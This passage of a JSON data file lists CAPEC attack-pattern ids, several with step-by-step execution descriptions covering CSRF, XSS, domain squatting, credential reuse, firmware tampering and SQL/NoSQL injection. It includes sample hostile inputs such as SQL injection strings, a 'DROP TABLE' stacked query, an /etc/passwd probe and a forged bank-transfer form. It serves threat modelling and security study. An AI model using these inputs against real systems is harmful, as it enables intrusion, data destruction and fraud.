        "step2": " [Impersonate trusted domain] In order to impersonate the trusted domain, the adversary needs to register the BitSquatted URL.. - Register the BitSquatted domain. ",
        "step3": " [Wait for a user to visit the domain] Finally, the adversary simply waits for a user to be unintentionally directed to the BitSquatted domain.. - Simply wait for an error in memory to occur, redirecting the user to the malicious domain.\n"
    },
    {
        "id": 493,
        "capec_id": "612"
    },
    {
        "id": 494,
        "capec_id": "613"
    },
    {
        "id": 495,
        "capec_id": "614"
    },
    {
        "id": 496,
        "capec_id": "615"
    },
    {
        "id": 497,
        "capec_id": "616"
    },
    {
        "id": 498,
        "capec_id": "617"
    },
    {
        "id": 499,
        "capec_id": "618"
    },
    {
        "id": 500,
        "capec_id": "619"
    },
    {
        "id": 501,
        "capec_id": "62",
        "step1": " [Explore target website] The attacker first explores the target website to determine pieces of functionality that are of interest to them (e.g. money transfers). The attacker will need a legitimate user account on the target website. It would help to have two accounts.. - Use web application debugging tool such as WebScarab, Tamper Data or TamperIE to analyze the information exchanged between the client and the server. - Use network sniffing tool such as Wireshark to analyze the information exchanged between the client and the server. - View HTML source of web pages that contain links or buttons that perform actions of interest. ",
        "step2": " [Create a link that when clicked on, will execute the interesting functionality.] The attacker needs to create a link that will execute some interesting functionality such as transfer money, change a password, etc.. - Create a GET request containing all required parameters (e.g. https://www.somebank.com/members/transfer.asp?to=012345678901&amt=10000). - Create a form that will submit a POST request (e.g. <form method=POST action=https://www.somebank.com/members/transfer.asp><input type=hidden Name=to value=012345678901/><input type=hidden Name=amt value=10000/><input type=submit src=clickhere.jpg/></form> ",
        "step3": " [Convince user to click on link] Finally, the attacker needs to convince a user that is logged into the target website to click on a link to execute the CSRF attack.. - Execute a phishing attack and send the user an e-mail convincing them to click on a link.. - Execute a stored XSS attack on a website to permanently embed the malicious link into the website.. - Execute a stored XSS attack on a website where an XMLHTTPRequest object will automatically execute the attack as soon as a user visits the page. This removes the step of convincing a user to click on a link.. - Include the malicious link on the attackers' own website where the user may have to click on the link, or where an XMLHTTPRequest object may automatically execute the attack when a user visits the site.\n"
    },
    {
        "id": 502,
        "capec_id": "620"
    },
    {
        "id": 503,
        "capec_id": "621"
    },
    {
        "id": 504,
        "capec_id": "622"
    },
    {
        "id": 505,
        "capec_id": "623"
    },
    {
        "id": 506,
        "capec_id": "624"
    },
    {
        "id": 507,
        "capec_id": "625"
    },
    {
        "id": 508,
        "capec_id": "626"
    },
    {
        "id": 509,
        "capec_id": "627"
    },
    {
        "id": 510,
        "capec_id": "628"
    },
    {
        "id": 511,
        "capec_id": "629"
    },
    {
        "id": 512,
        "capec_id": "63",
        "step1": " [Survey the application for user-controllable inputs] Using a browser or an automated tool, an attacker follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.. - Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.. - Use a proxy tool to record all links visited during a manual traversal of the web application.. - Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery. ",
        "step2": " [Probe identified potential entry points for XSS vulnerability] The attacker uses the entry points gathered in the Explore phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.. - Use a list of XSS probe strings to inject script in parameters of known URLs. If possible, the probe strings contain a unique identifier.. - Use a proxy tool to record results of manual input of XSS probes in known URLs.. - Use a list of XSS probe strings to inject script into UI entry fields. If possible, the probe strings contain a unique identifier.. - Use a list of XSS probe strings to inject script into resources accessed by the application. If possible, the probe strings contain a unique identifier. ",
        "step3": " [Steal session IDs, credentials, page content, etc.] As the attacker succeeds in exploiting the vulnerability, they can choose to steal user's credentials in order to reuse or to analyze them later on.. - Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.. - Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately. ",
        "step4": " [Forceful browsing] When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).. - Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site. - Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities). ",
        "step5": " [Content spoofing] By manipulating the content, the attacker targets the information that the user would like to get from the website.. - Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.\n"
    },
    {
        "id": 513,
        "capec_id": "630",
        "step1": " [Determine target website] The adversary first determines which website to impersonate, generally one that is trusted and receives a consistent amount of traffic.. - Research popular or high traffic websites. ",
        "step2": " [Impersonate trusted domain] In order to impersonate the trusted domain, the adversary needs to register the TypoSquatted URL.. - Register the TypoSquatted domain. ",
        "step3": " [Deceive user into visiting domain] Finally, the adversary needs to deceive a user into visiting the TypoSquatted domain.. - Execute a phishing attack and send a user an e-mail convincing the user to click on a link leading the user to the TypoSquatted domain.. - Assume that a user will incorrectly type the legitimate URL, leading the user to the TypoSquatted domain.\n"
    },
    {
        "id": 514,
        "capec_id": "631",
        "step1": " [Determine target website] The adversary first determines which website to impersonate, generally one that is trusted, receives a consistent amount of traffic, and is a homophone.. - Research popular or high traffic websites which are also homophones. ",
        "step2": " [Impersonate trusted domain] In order to impersonate the trusted domain, the adversary needs to register the SoundSquatted URL.. - Register the SoundSquatted domain. ",
        "step3": " [Deceive user into visiting domain] Finally, the adversary needs to deceive a user into visiting the SoundSquatted domain.. - Execute a phishing attack and send a user an e-mail convincing the user to click on a link leading the user to the SoundSquatted domain.. - Assume that a user will unintentionally use the homophone in the URL, leading the user to the SoundSquatted domain.\n"
    },
    {
        "id": 515,
        "capec_id": "632",
        "step1": " [Determine target website] The adversary first determines which website to impersonate, generally one that is trusted and receives a consistent amount of traffic.. - Research popular or high traffic websites. ",
        "step2": " [Impersonate trusted domain] In order to impersonate the trusted domain, the adversary needs to register the URL containing the homoglpyh character(s).. - Register the Homograph domain. ",
        "step3": " [Deceive user into visiting domain] Finally, the adversary needs to deceive a user into visiting the Homograph domain.. - Execute a phishing attack and send a user an e-mail convincing the to click on a link leading the user to the malicious domain.\n"
    },
    {
        "id": 516,
        "capec_id": "633"
    },
    {
        "id": 517,
        "capec_id": "634"
    },
    {
        "id": 518,
        "capec_id": "635"
    },
    {
        "id": 519,
        "capec_id": "636"
    },
    {
        "id": 520,
        "capec_id": "637",
        "step1": " [Find an application that allows copying sensititve data to clipboad] An adversary first needs to find an application that allows copying and pasting of sensitive information. This could be an application that prints out temporary passwords to the screen, private email addresses, or any other sensitive information or data ",
        "step2": " [Target users of the application] An adversary will target users of the application in order to obtain the information in their clipboard on a periodic basic. - Install malware on a user's system designed to log clipboard contents periodically. - Get the user to click on a malicious link that will bring them to an application to log the contents of the clipboard ",
        "step3": " [Follow-up attack] Use any sensitive information found to carry out a follow-up attack.\n"
    },
    {
        "id": 521,
        "capec_id": "638",
        "step1": " [Select Target] The adversary searches for a suitable target to attack, such as government and/or private industry organizations.. - Conduct reconnaissance to determine potential targets to exploit. ",
        "step2": " [Identify Components] After selecting a target, the adversary determines whether a vulnerable component, such as a specific make and model of a HDD, is contained within the target system.. - [Remote Access Vector] The adversary gains remote access to the target, typically via additional malware, and explores the system to determine hardware components that are being leveraged.. - [Physical Access Vector] The adversary intercepts components in transit and determines if the component is vulnerable to attack. ",
        "step3": " [Optional: Create Payload] If not using an already existing payload, the adversary creates their own to be executed at defined intervals and upon system boot processes. This payload may then be tested on the target system or a test system to confirm its functionality. ",
        "step4": " [Insert Firmware Altering Malware] Once a vulnerable component has been identified, the adversary leverages known malware tools to infect the component's firmware and drop the payload within the component's MBR. This allows the adversary to maintain persistence on the target and execute the payload without being detected.. - The adversary inserts the firmware altering malware on the target component, via the use of known malware tools.. - [Physical Access Vector] The adversary then sends the component to its original intended destination, where it will be installed onto a victim system.\n"
    },
    {
        "id": 522,
        "capec_id": "639"
    },
    {
        "id": 523,
        "capec_id": "64",
        "step1": " The attacker accesses the server using a specific URL. ",
        "step2": " The attacker tries to encode some special characters in the URL. The attacker find out that some characters are not filtered properly. ",
        "step3": " The attacker crafts a malicious URL string request and sends it to the server. ",
        "step4": " The server decodes and interprets the URL string. Unfortunately since the input filtering is not done properly, the special characters have harmful consequences.\n"
    },
    {
        "id": 524,
        "capec_id": "640",
        "step1": " [Determine target process] The adversary determines a process with sufficient privileges that they wish to include code into.. - On Windows, use the process explorer's security tab to see if a process is running with administror privileges.. - On Linux, use the ps command to view running processes and pipe the output to a search for a particular user, or the root user. ",
        "step2": " [Attempt to include simple code with known output] The adversary attempts to include very simple code into the existing process to determine if the code inclusion worked. The code will differ based on the approach used to include code into an existing process. ",
        "step3": " [Include arbitrary code into existing process] Once an adversary has determined that including code into the existing process is possible, they will include code for a targeted purpose, such as accessing that process's memory.\n"
    },
    {
        "id": 525,
        "capec_id": "641"
    },
    {
        "id": 526,
        "capec_id": "642"
    },
    {
        "id": 527,
        "capec_id": "643"
    },
    {
        "id": 528,
        "capec_id": "644",
        "step1": " [Acquire known Windows credential hash value pairs] The adversary must obtain known Windows credential hash value pairs of accounts that exist on the domain.. - An adversary purchases breached Windows credential hash value pairs from the dark web.. - An adversary conducts a sniffing attack to steal Windows credential hash value pairs as they are transmitted.. - An adversary gains access to a Windows domain system/files and exfiltrates Windows credential hash value pairs.. - An adversary examines outward-facing configuration and properties files to discover hardcoded Windows credential hash value pairs. ",
        "step2": " [Attempt domain authentication] Try each Windows credential hash value pair until the target grants access.. - Manually or automatically enter each Windows credential hash value pair through the target's interface. ",
        "step3": " [Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system, or to laterally move within the domain ",
        "step4": " [Spoofing] Malicious data can be injected into the target system or into other systems on the domain. The adversary can also pose as a legitimate domain user to perform social engineering attacks. ",
        "step5": " [Data Exfiltration] The adversary can obtain sensitive data contained within domain systems or applications.\n"
    },
    {
        "id": 529,
        "capec_id": "645"
    },
    {
        "id": 530,
        "capec_id": "646"
    },
    {
        "id": 531,
        "capec_id": "647",
        "step1": " [Gain logical access to system] An adversary must first gain logical access to the system it wants to gather registry information from,. - Obtain user account credentials and access the system. - Plant malware on the system that will give remote logical access to the adversary ",
        "step2": " [Determine if the permissions are correct] Once logical access is gained, an adversary will determine if they have the proper permissions, or are authorized, to view registry information. If they do not, they will need to escalate privileges on the system through other means ",
        "step3": " [Peruse registry for information] Once an adversary has access to a registry, they will gather all system-specific data and sensitive information that they deem useful. ",
        "step4": " [Follow-up attack] Use any information or weaknesses found to carry out a follow-up attack.\n"
    },
    {
        "id": 532,
        "capec_id": "648"
    },
    {
        "id": 533,
        "capec_id": "649"
    },
    {
        "id": 534,
        "capec_id": "65",
        "step1": " [Set up a sniffer] The adversary sets up a sniffer in the path between the server and the client and watches the traffic.. - The adversary sets up a sniffer in the path between the server and the client. ",
        "step2": " [Capturing Application Code Bound During Patching]adversary knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The adversary loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The adversary then proceeds to reverse engineer the captured code.. - adversary loads the sniffer to capture the application code bound during a dynamic update.. - The adversary proceeds to reverse engineer the captured code.\n"
    },
    {
        "id": 535,
        "capec_id": "650"
    },
    {
        "id": 536,
        "capec_id": "651"
    },
    {
        "id": 537,
        "capec_id": "652",
        "step1": " [Acquire known Kerberos credentials] The adversary must obtain known Kerberos credentials in order to access the target system, application, or service within the domain.. - An adversary purchases breached Kerberos service account username/password combinations or leaked hashed passwords from the dark web.. - An adversary guesses the credentials to a weak Kerberos service account.. - An adversary conducts a sniffing attack to steal Kerberos tickets as they are transmitted.. - An adversary conducts a Kerberoasting attack. ",
        "step2": " [Attempt Kerberos authentication] Try each Kerberos credential against various resources within the domain until the target grants access.. - Manually or automatically enter each Kerberos service account credential through the target's interface.. - Attempt a Pass the Ticket attack. ",
        "step3": " [Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system, or to laterally move within the domain ",
        "step4": " [Spoofing] Malicious data can be injected into the target system or into other systems on the domain. The adversary can also pose as a legitimate domain user to perform social engineering attacks. ",
        "step5": " [Data Exfiltration] The adversary can obtain sensitive data contained within domain systems or applications.\n"
    },
    {
        "id": 538,
        "capec_id": "653",
        "step1": " [Acquire known Windows credentials] The adversary must obtain known Windows credentials in order to access the target system, application, or service within the domain.. - An adversary purchases breached Windows username/password combinations or leaked hashed passwords from the dark web.. - An adversary leverages a key logger or phishing attack to steal user credentials as they are provided.. - An adversary conducts a sniffing attack to steal Windows credentials as they are transmitted.. - An adversary gains access to a Windows domain system/files and exfiltrates Windows password hashes.. - An adversary examines outward-facing configuration and properties files to discover hardcoded Windows credentials. ",
        "step2": " [Attempt domain authentication] Try each Windows credential against various systems, applications, and services within the domain until the target grants access.. - Manually or automatically enter each credential through the target's interface. ",
        "step3": " [Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system, or to laterally move within the domain ",
        "step4": " [Spoofing] Malicious data can be injected into the target system or into other systems on the domain. The adversary can also pose as a legitimate domain user to perform social engineering attacks. ",
        "step5": " [Data Exfiltration] The adversary can obtain sensitive data contained within domain systems or applications.\n"
    },
    {
        "id": 539,
        "capec_id": "654",
        "step1": " [Determine suitable tasks to exploit] Determine what tasks exist on the target system that may result in a user providing their credentials.. - Determine what tasks prompt a user for their credentials. ",
        "step2": " [Impersonate Task] Impersonate a legitimate task, either expected or unexpected, in an attempt to gain user credentials.. - Prompt a user for their credentials, while making the user believe the credential request is legitimate.\n"
    },
    {
        "id": 540,
        "capec_id": "655"
    },
    {
        "id": 541,
        "capec_id": "656",
        "step1": " [Obtain domain name and certificate to spoof legitimate site] This optional step can be used to help the adversary impersonate the legitimate organization more convincingly. The adversary can use homograph or similar attacks to convince users that they are using the legitimate website. If the adversary leverages cold-calling for this attack, this step is skipped.. - Optionally obtain a domain name that visually looks similar to the legitimate organization's domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i, instead of a lower case L). - Optionally obtain a legitimate SSL certificate for the new domain name. ",
        "step2": " [Explore legitimate website and create duplicate] An adversary optionally creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the organization's website that they are trying to impersonate. That website will contain a telephone number for the victim to call to assist them with their issue and initiate the attack. If the adversary leverages cold-calling for this attack, this step is skipped.. - Use spidering software to get copy of web pages on legitimate site.. - Manually save copies of required web pages from legitimate site.. - Create new web pages that have the legitimate site's look and feel, but contain completely new content. ",
        "step3": " [Convince user to provide sensitive information to the adversary.] An adversary cold calls the victim or receives a call from the victim via the malicious site and provides a call-to-action, in order to persuade the user into providing sensitive details to the adversary (e.g. login credentials, bank account information, etc.). The key is to get the victim to believe that the individual they are talking to is from a legitimate entity with which the victim does business and that the call is occurring for legitimate reasons. A call-to-action will usually need to sound legitimate and urgent enough to prompt action from the user.. - Call the user a from a spoofed legitimate-looking telephone number. ",
        "step4": " [Use stolen information] Once the adversary obtains the sensitive information, this information can be leveraged to log into the victim's bank account and transfer money to an account of their choice, or to make fraudulent purchases with stolen credit card information.. - Login to the legitimate site using another the victim's supplied credentials.\n"
    },
    {
        "id": 542,
        "capec_id": "657"
    },
    {
        "id": 543,
        "capec_id": "66",
        "step1": " [Survey application] The attacker first takes an inventory of the functionality exposed by the application.. - Spider web sites for all available links. - Sniff network communications with application using a utility such as WireShark. ",
        "step2": " [Determine user-controllable input susceptible to injection] Determine the user-controllable input susceptible to injection. For each user-controllable input that the attacker suspects is vulnerable to SQL injection, attempt to inject characters that have special meaning in SQL (such as a single quote character, a double quote character, two hyphens, a parenthesis, etc.). The goal is to create a SQL query with an invalid syntax.. - Use web browser to inject input through text fields or through HTTP GET parameters.. - Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.. - Use network-level packet injection tools such as netcat to inject input. - Use modified client (modified by reverse engineering) to inject input. ",
        "step3": " [Experiment with SQL Injection vulnerabilities] After determining that a given input is vulnerable to SQL Injection, hypothesize what the underlying query looks like. Iteratively try to add logic to the query to extract information from the database, or to modify or delete information in the database.. - Use public resources such as SQL Injection Cheat Sheet at http://ferruh.mavituna.com/makale/sql-injection-cheatsheet/, and try different approaches for adding logic to SQL queries.. - Add logic to query, and use detailed error messages from the server to debug the query. For example, if adding a single quote to a query causes an error message, try : ' OR 1=1; --, or something else that would syntactically complete a hypothesized query. Iteratively refine the query.. - Use Blind SQL Injection techniques to extract information about the database schema.. - If a denial of service attack is the goal, try stacking queries. This does not work on all platforms (most notably, it does not work on Oracle or MySQL). Examples of inputs to try include: '; DROP TABLE SYSOBJECTS; -- and '); DROP TABLE SYSOBJECTS; --. These particular queries will likely not work because the SYSOBJECTS table is generally protected. ",
        "step4": " [Exploit SQL Injection vulnerability] After refining and adding various logic to SQL queries, craft and execute the underlying SQL query that will be used to attack the target system. The goal is to reveal, modify, and/or delete database data, using the knowledge obtained in the previous step. This could entail crafting and executing multiple SQL queries if a denial of service attack is the intent.. - Craft and Execute underlying SQL query.\n"
    },
    {
        "id": 544,
        "capec_id": "660",
        "step1": " [Identify application with attack potential] The adversary searches for and identifies a mobile application that could be exploited for malicious purposes (e.g. banking, voting, or medical applications).. - Search application stores for mobile applications worth exploiting ",
        "step2": " [Develop code to be hooked into chosen target application] The adversary develops code or leverages existing code that will be hooked into the target application in order to evade Root/Jailbreak detection methods.. - Develop code or leverage existing code to bypass Root/Jailbreak detection methods.. - Test the code to see if it works.. - Iteratively develop the code until Root/Jailbreak detection methods are evaded. ",
        "step3": " [Execute code hooking to evade Root/Jailbreak detection methods] Once hooking code has been developed or obtained, execute the code against the target application to evade Root/Jailbreak detection methods.. - Hook code into the target application.\n"
    },
    {
        "id": 545,
        "capec_id": "661",
        "step1": " [Identify application with attack potential] The adversary searches for and identifies a mobile application that could be exploited for malicious purposes (e.g. banking, voting, or medical applications).. - Search application stores for mobile applications worth exploiting ",
        "step2": " [Debug the target application] The adversary inserts the debugger into the program entry point of the mobile application, after the application's signature has been identified, to dump its memory contents.. - Insert the debugger at the mobile application's program entry point, after the application's signature has been identified.. - Dump the memory region containing the now decrypted code from the address space of the binary. ",
        "step3": " [Remove application signature verification methods] Remove signature verification methods from the decrypted code and resign the application with a self-signed certificate. ",
        "step4": " [Execute the application and evade Root/Jailbreak detection methods] The application executes with the self-signed certificate, while believing it contains a trusted certificate. This now allows the adversary to evade Root/Jailbreak detection via code hooking or other methods.. - Optional: Hook code into the target application.\n"
    },
    {
        "id": 546,
        "capec_id": "662",
        "step1": " The adversary tricks the victim into installing the Trojan Horse malware onto their system.. - Conduct phishing attacks, drive-by malware installations, or masquerade malicious browser extensions as being legitimate. ",
        "step2": " The adversary inserts themself into the communication channel initially acting as a routing proxy between the two targeted components. ",
        "step3": " The adversary observes, filters, or alters passed data of their choosing to gain access to sensitive information or to manipulate the actions of the two target components for their own purposes.\n"
    },
    {
        "id": 547,
        "capec_id": "663",
        "step1": " [Survey target application and relevant OS shared code libraries] Adversary identifies vulnerable transient instruction sets and the code/function calls to trigger them as well as instruction sets or code fragments (gadgets) to perform attack.. - Utilize Disassembler and Debugger tools to examine and trace instruction set execution of source code and shared code libraries on a system. ",
        "step2": " [Explore cache and identify impacts] Utilize tools to understand the impact of transient instruction execution upon address spaces and CPU operations.. - Run OS or application specific tools that examine the contents of cache.",
        "step3": " [Cause conditions for identified transient instruction set execution] Adversary ensures that specific code/instructions of the target process are executed by CPU, so desired transient instructions are executed. ",
        "step4": " [Cause specific secret data to be cached from restricted address space] Executed instruction sets (gadgets) in target address space, initially executed via adversary-chosen transient instructions sets, establish covert channel and transfer secret data across this channel to cache.. - Prediction-based - adversary trains CPU to incorrectly predict/speculate conditions for instruction execution to be true, hence executing adversary-chosen transient instructions. These prediction-based methods include: Pattern History Table (PHT)/Input Validation Bypass, Branch Target Buffer (BTB)/Branch Target Injection, Return Stack Buffer (RSB)/Return Address Injection, and Store To Load (STL)/Speculative Store Bypass.. - Exception/Fault-based - adversary has CPU execute transient instructions that raise an exception allowing inaccessible memory space to be accessed via out-of-order execution. These exception/fault-based methods include: Supervisor-only Bypass, Virtual Translation Bypass, System Register Bypass, FPU Register Bypass, Read-only Bypass, Protection Key Bypass, and Bounds Check Bypass. ",
        "step5": " :[Perform covert channel attack to obtain/access secret data] Adversary process code removes instructions/data from shared cache set, waits for target process to reinsert them back into cache, to identify location of secret data via a timing method. Adversary continuously repeat this process to identify and access entirety of targeted secret data.. - Flush+Reload - adversary frequently flushes targeted memory cache line using a dedicated machine flush instruction, and uses another process to measure time taken for CPU to load victim secret data.. - Evict+Time - adversary causes victim to load target set into cache and measures time for victim process to load this data, setting a baseline. Adversary evicts a specified cache line and causes victim process to execute again, and measures any change in execution time, to determine if cache line was accessed.. - Prime+Probe - adversary primes cache by filling cache line(s) or set(s) with data, after some time victim process evicts this adversary data to replace it with secret data. The adversary then probes/accesses all the previously accessed cache lines detecting cache misses, which determine that their attacker data has been evicted and replaced with secret data from victim process.\n"
    },
    {
        "id": 548,
        "capec_id": "664",
        "step1": " [Find target application] Find target web application that accepts a user input and retrieves data from the server ",
        "step2": " [Examine existing application requests] Examine HTTP/GET requests to view the URL query format. Adversaries test to see if this type of attack is possible through weaknesses in an application's protection to Server Side Request Forgery. - Attempt manipulating the URL to retrieve an error response/code from the server to determine if URL/request validation is done.. - Use a list of XSS probe strings to specify as parameters to known URLs. If possible, use probe strings with unique identifiers.. - Create a GET request with a common server file path such as /etc/passwd as a parameter and examine output. ",
        "step3": " [Malicious request] Adversary crafts a malicious URL request that assumes the privilege level of the server to query internal or external network services and sends the request to the application.\n"
    },
    {
        "id": 549,
        "capec_id": "665",
        "step1": " [Survey physical victim environment and potential Thunderbolt system targets] The adversary monitors the target's physical environment to identify systems with Thunderbolt interfaces, identify potential weaknesses in physical security in addition to periods of nonattendance by the victim over their Thunderbolt interface equipped devices, and when the devices are in locked or sleep state. ",
        "step2": " [Evaluate the target system and its Thunderbolt interface] The adversary determines the device's operating system, Thunderbolt interface version, and any implemented Thunderbolt protections to plan the attack.",
        "step3": " [Obtain and/or clone firmware image] The adversary physically manipulates Thunderbolt enabled devices to acquire the firmware image from the target and/or adversary Thunderbolt host controller's SPI (Serial Peripheral Interface) flash.. - Disassemble victim and/or adversary device enclosure with basic tools to gain access to Thunderbolt controller SPI flash by connecting adversary SPI programmer.. - Adversary connects SPI programmer to adversary-controlled Thunderbolt enabled device to obtain/clone victim thunderbolt controller firmware image through tools/scripts.. - Clone firmware image with SPI programmer and tools/scripts on adversary-controlled device. ",
        "step4": " [Parse and locate relevant firmware data structures and information based upon Thunderbolt controller model, firmware version, and other information] The acquired victim and/or adversary firmware image is parsed for specific data and other relevant identifiers required for exploitation, based upon the victim device information and firmware version.. - Utilize pre-crafted tools/scripts to parse and locate desired firmware data and modify it.. - Locate DROM (Device Read Only Memory) data structure section and calculate/determine appropriate offset to replicate victim device UUID.. - Locate ACL (Access Control List) data structure and calculate/determine appropriate offsets to identify victim device UUID.. - Locate data structure containing challenge-response key information between appropriate offsets. ",
        "step5": " [Disable Thunderbolt security and prevent future Thunderbolt security modifications (if necessary)] The adversary overrides the target device's Thunderbolt Security Level to None (SL0) and/or enables block protections upon the SPI flash to prevent the ability for the victim to perform and/or recognize future Thunderbolt security modifications as well as update the Thunderbolt firmware.. - The adversary-controlled Thunderbolt device, connected to SPI programmer and victim device via Thunderbolt ports, is utilized to execute commands within tools/scripts to disable SPI flash protections, modify Thunderbolt Security Level, and enable malicious SPI flash protections. ",
        "step6": " [Modify/replace victim Thunderbolt firmware image] The modified victim and/or adversary thunderbolt firmware image is written to attacker SPI flash. ",
        "step7": " :[Connect adversary-controlled thunderbolt enabled device to victim device and verify successful execution of malicious actions] The adversary needs to determine if their exploitation of selected vulnerabilities had the intended effects upon victim device.. - Observe victim device identify adversary device as the victim device and enables PCIe tunneling.. - Resume victim device from sleep, connect adversary-controlled device and observe security is disabled and Thunderbolt connectivity is restored with PCIe tunneling being enabled.. - Observe that in UEFI or Thunderbolt Management Tool/UI that the Security Level does not match adversary modified Security Level of None (SL0). - Observe after installation of Firmware update that within Thunderbolt Management UI the NVM version is unchanged/same prior to the prompt of successful Firmware update/installation. ",
        "step8": " [Exfiltration of desired data from victim device to adversary device] Utilize PCIe tunneling to transfer desired data and information from victim device across Thunderbolt connection.\n"
    },
    {
        "id": 550,
        "capec_id": "666",
        "step1": " [Scan for Bluetooth Enabled Devices] Using BlueZ along with an antenna, an adversary searches for devices with Bluetooth on.. - Note the MAC address of the device you want to attack. ",
        "step2": " [Change L2CAP Packet Length] The adversary must change the L2CAP packet length to create packets that will overwhelm a Bluetooth enabled device.. - An adversary downloads and installs BlueZ, the standard Bluetooth utility package for Linux. ",
        "step3": " [Flood] An adversary sends the packets to the target device, and floods it until performance is degraded.\n"
    },
    {
        "id": 551,
        "capec_id": "667",
        "step1": " [Find disguise and target] The adversary starts the Bluetooth service on the attacking device and searches for nearby listening devices.. - Knowledge of a trusted MAC address.. - Scanning for devices other than the target that may be trusted. ",
        "step2": " [Disguise] Using the MAC address of the device the adversary wants to impersonate, they may use a tool such as spooftooth or macchanger to spoof their Bluetooth address and attempt to authenticate with the target. ",
        "step3": " [Use device capabilities to accomplish goal] Finally, if authenticated successfully the adversary can perform tasks/information gathering dependent on the target's capabilities and connections.\n"
    },
    {
        "id": 552,
        "capec_id": "668",
        "step1": " [Discovery] Using an established Person in the Middle setup, search for Bluetooth devices beginning the authentication process.. - Use packet capture tools. ",
        "step2": " [Change the entropy bits] Upon recieving the initial key negotiation packet from the master, the adversary modifies the entropy bits requested to 1 to allow for easy decryption before it is forwarded. ",
        "step3": " [Capture and decrypt data] Once the entropy of encryption is known, the adversary can capture data and then decrypt on their device.\n"
    },
    {
        "id": 553,
        "capec_id": "669",
        "step1": " [Identify software with frequent updates] The adversary must first identify a target software that has updates at least with some frequency, enough that there is am update infrastructure. ",
        "step2": " [Gain access to udpate infrastructure] The adversary must then gain access to the organization's software update infrastructure. This can either be done by gaining remote access from outside the organization, or by having a malicious actor inside the organization gain access. It is often easier if someone within the organization gains access. ",
        "step3": " [Alter the software update] Through access to the software update infrastructure, an adversary will alter the software update by injecting malware into the content of an outgoing update.\n"
    },
    {
        "id": 554,
        "capec_id": "67",
        "step1": " [Identify target application] The adversary identifies a target application or program to perform the buffer overflow on. In this attack, adversaries look for applications that use syslog() incorrectly. ",
        "step2": " [Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer. For each user-controllable input that the adversary suspects is vulnerable to format string injection, attempt to inject formatting characters such as %n, %s, etc.. The goal is to manipulate the string creation using these formatting characters.. - Inject probe payload which contains formatting characters (%s, %d, %n, etc.) through input parameters. ",
        "step3": " [Craft overflow content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary will craft a set of content that not only overflows the targeted buffer but does so in such a way that the overwritten return address is replaced with one of the adversaries' choosing which points to code injected by the adversary.. - The formatting characters %s and %d are useful for observing memory and trying to print memory addresses. If an adversary has access to the log being written to they can observer this output and use it to help craft their attack.. - The formatting character %n is useful for adding extra data onto the buffer. ",
        "step4": " [Overflow the buffer] Using the injection vector, the adversary supplies the program with the crafted format string injection, causing a buffer.\n"
    },
    {
        "id": 555,
        "capec_id": "670"
    },
    {
        "id": 556,
        "capec_id": "671"
    },
    {
        "id": 557,
        "capec_id": "672"
    },
    {
        "id": 558,
        "capec_id": "673"
    },
    {
        "id": 559,
        "capec_id": "674"
    },
    {
        "id": 560,
        "capec_id": "675"
    },
    {
        "id": 561,
        "capec_id": "676",
        "step1": " [Survey target application] Due to the number of NoSQL databases available and the numerous language/API combinations of each, the adversary must first survey the target application to learn what technologies are being leveraged and how they interact with user-driven data.. - Determine the technology stack leveraged by the target application, such as the application server, drivers, frameworks, APIs, and databases being utilized.. - Identify areas of the application that interact with user input and may be involved with NoSQL queries. ",
        "step2": " [Identify user-controllable input susceptible to injection] After identifying the technology stack being used and where user-driven input is leveraged, determine the user-controllable input susceptible to injection such as authentication or search forms. For each user-controllable input that the adversary suspects is vulnerable to NoSQL injection, attempt to inject characters or keywords that have special meaning in the given NoSQL database or language (e.g., $ne for MongoDB or $exists for PHP/MongoDB), or JavaScript that can be executed within the application. The goal is to create a NoSQL query with an invalid syntax.. - Use web browser to inject input through text fields or through HTTP GET parameters.. - Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.. - Use network-level packet injection tools such as netcat to inject input. - Use modified client (modified by reverse engineering) to inject input. ",
        "step3": " [Experiment with NoSQL Injection vulnerabilities] After determining that a given input is vulnerable to NoSQL Injection, hypothesize what the underlying query looks like. Iteratively try to add logic to the query to extract information from the database, modify/delete information in the database, or execute commands on the server.. - Use public resources such as OWASP's Testing for NoSQL Injection [REF-668] or Null Sweep's NoSQL Injection Cheatsheet [REF-669] and try different approaches for adding logic to NoSQL queries.. - Iteratively add logic to the NoSQL query and use detailed error messages from the server to debug the query.. - Attempt an HTTP Parameter Pollution attack to replace language-specific keywords, such as where within PHP [CAPEC-460]. ",
        "step4": " [Exploit NoSQL Injection vulnerability] After refining and adding various logic to NoSQL queries, craft and execute the underlying NoSQL query that will be used to attack the target system.. - Craft and Execute underlying NoSQL query.\n"
    },
    {
        "id": 562,
        "capec_id": "677"
    },
    {
        "id": 563,
        "capec_id": "678"
    },
    {
        "id": 564,
        "capec_id": "679"
    },
    {
